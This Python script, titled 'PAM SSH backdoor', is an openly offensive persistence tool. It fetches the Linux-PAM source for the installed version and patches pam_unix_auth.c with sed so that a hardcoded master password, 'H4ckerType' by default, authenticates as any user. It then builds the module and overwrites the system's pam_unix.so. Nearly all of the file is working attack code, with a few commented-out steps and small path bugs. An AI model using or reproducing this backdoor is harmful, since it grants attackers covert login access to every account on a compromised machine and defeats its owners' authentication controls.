#!/usr/bin/python3
#PAM SSH backdoor
#PASSWORD,no,Master password for any user
#PAM_VERSION,no,Set version of PAM if if you know it
#END

import os
import subprocess

def get_pam_version():
    pam_version = subprocess.check_output("dpkg -l | grep -i libpam-modules", shell=True)
    pam_version = pam_version.decode('utf-8').split()[2]
    return pam_version

def get_pam_source_code(pam_version):
    
    if '1.1.6' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/archive/refs/tags/v1.1.6.tar.gz -O /tmp/pam_source_116.tar.gz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_116.tar.gz -C /tmp/pam_source --strip-components 1')
    elif '1.1.7' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_7.tar.gz -O /tmp/pam_source_117.tar.gz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_117.tar.gz -C /tmp/pam_source --strip-components 1')
    elif '1.1.8' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz -O /tmp/pam_source_118.tar.gz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_118.tar.gz -C /tmp/pam_source --strip-components 1')
    elif '1.2.0' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_0.tar.gz -O /tmp/pam_source_120.tar.gz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_120.tar.gz -C /tmp/pam_source --strip-components 1')
    elif '1.2.1' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_2_1.tar.gz -O /tmp/pam_source_121.tar.gz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_121.tar.gz -C /tmp/pam_source --strip-components 1')
    elif '1.3.0' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1.3.0.tar.gz -O /tmp/pam_source_130.tar.gz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_130.tar.gz -C /tmp/pam_source --strip-components 1') 
    elif '1.3.1' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/releases/download/v1.3.1/Linux-PAM-1.3.1.tar.xz -O /tmp/pam_source_131.tar.xz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_131.tar.xz -C /tmp/pam_source --strip-components 1')
    elif '1.4.0' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz -O /tmp/pam_source_140.tar.xz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_140.tar.xz -C /tmp/pam_source --strip-components 1')
    elif '1.5.0' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/releases/download/v1.5.0/Linux-PAM-1.5.0.tar.xz -O /tmp/pam_source_150.tar.xz && mkdir /tmp/pam_source && tar -xf /tmp/pam_source_150.tar.xz -C /tmp/pam_source --strip-components 1')
    elif '1.5.1' in pam_version:
        os.system('wget -c https://github.com/linux-pam/linux-pam/releases/download/v1.5.1/Linux-PAM-1.5.1.tar.xz -O /tmp/pam_source_151.tar.xz && mkdir /tmp/pam_source && tar -xf /tmppam_source_151.tar.xz -C /tmp/pam_source --strip-components 1')
    

def put_backdoor_into_code(password, path_to_source_code):
    sed_replace_rule = 'retval = _unix.*/if (strcmp(p, \\"' + password + '\\") != 0) {\\n\\t\\t&\\n\\t} else {\\n\\t\\tretval = PAM_SUCCESS;\\n\\t}'
    os.system("sed -i 's/" + sed_replace_rule + "/g' " + path_to_source_code + "/modules/pam_unix/pam_unix_auth.c")
    pass    

def compile_modified_pam(path_to_source):
    if 'autogen.sh' in os.listdir(path_to_source):
        os.system('/tmp/pam_source/autoconf.sh') # PACKAGES REQUIRED: [apt-get -qq install automake autopoint gettext xsltproc docbook-xml docbook-xsl libxml2-utils bison flex] # https://github.com/linux-pam/linux-pam/issues/30 <--- ISSUE
    os.system('cd /tmp/pam_source && ./configure')
    os.system('cd /tmp/pam_source && make')


def find_original_pam():
    return subprocess.check_output("find /lib/ -name pam_unix.so", shell=True).decode('utf-8').strip()
    
def create_backup_of_original_pam(path_to_original_pam):
    os.system('cp ' + path_to_original_pam + ' ' + path_to_original_pam + '.bak')

def copy_backdoored_pam(path_to_backdoored_pam, path_to_original_pam):
    os.system('cp ' + path_to_backdoored_pam + ' ' + path_to_original_pam)
    pass

def create_backdoor(password, path_to_source_code):
    if password == "":
        password = "H4ckerType"

    put_backdoor_into_code(password, path_to_source_code)
    compile_modified_pam(path_to_source_code)

def main(arguments):
    #if not arguments[1]:
    #    get_pam_source_code(get_pam_version())
    #else:
    #    get_pam_source_code(arguments[1])

    path_to_source_code = "/tmp/pam_source"
    #create_backdoor(arguments[0], path_to_source_code)
    create_backup_of_original_pam(find_original_pam())
    copy_backdoored_pam(path_to_source_code + "/modules/pam_unix/.libs/pam_unix.so", find_original_pam())

main(["", ""])
